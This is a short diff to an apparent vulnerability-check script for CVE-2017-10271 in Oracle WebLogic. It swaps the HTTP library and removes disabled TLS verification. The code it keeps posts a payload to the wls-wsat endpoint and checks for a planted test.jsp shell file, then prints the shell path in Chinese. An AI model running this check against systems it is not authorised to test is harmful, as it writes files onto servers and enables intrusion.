@@ -9,9 +9,8 @@ import os
 import re
 import json
 import time
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class CVE_2017_10271_BaseVerify:
     def __init__(self, url):
@@ -49,8 +48,8 @@ class CVE_2017_10271_BaseVerify:
         try:
             if "/wls-wsat/CoordinatorPortType" not in self.url:
                 payload_url = self.url + "/wls-wsat/CoordinatorPortType"
-            result = requests.post(payload_url, headers = self.headers,data = self.payload, verify = False)
-            check = requests.get(self.url +  '/bea_wls_internal/test.jsp', verify = False)
+            result = request.post(payload_url, headers = self.headers,data = self.payload)
+            check = request.get(self.url +  '/bea_wls_internal/test.jsp')
             if check.status_code == 200 and str(check.text).strip() == 'test':
                 print ("存在CVE-2017-10271漏洞，shell文件路径为："+ self.url +'/bea_wls_internal/test.jsp')
                 return True
